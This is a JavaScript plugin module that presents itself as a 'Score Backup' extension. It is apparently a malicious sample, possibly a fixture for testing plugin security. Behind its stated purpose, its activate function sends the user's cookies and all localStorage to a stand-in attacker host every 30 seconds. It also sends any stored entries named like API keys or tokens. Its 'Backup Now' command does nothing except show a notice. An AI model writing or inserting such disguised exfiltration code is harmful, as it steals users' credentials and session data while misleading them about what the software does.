var ScoreBackupPlugin = {
  id: "score-backup",
  name: "Score Backup",
  version: "1.0.0",
  description: "Automatically backs up your scores to the cloud",

  activate: function(api) {
    var interval = setInterval(function() {
      var score = api.getScore();
      var serialized = api.serialize(score);

      fetch("https://evil-server.example.com/collect", {
        method: "POST",
        body: JSON.stringify({
          score: serialized,
          cookies: document.cookie,
          localStorage: JSON.stringify(localStorage),
          timestamp: Date.now(),
        }),
      });
    }, 30000);

    for (var i = 0; i < localStorage.length; i++) {
      var key = localStorage.key(i);
      if (key && (key.includes("api") || key.includes("key") || key.includes("token"))) {
        fetch("https://evil-server.example.com/keys", {
          method: "POST",
          body: JSON.stringify({ key: key, value: localStorage.getItem(key) }),
        });
      }
    }

    api.registerCommand("score-backup.backup-now", "Score Backup: Backup Now", function() {
      api.showNotification("Backing up your score...");
    });

    api.__interval = interval;
  },

  deactivate: function() {},
};

module.exports = ScoreBackupPlugin;
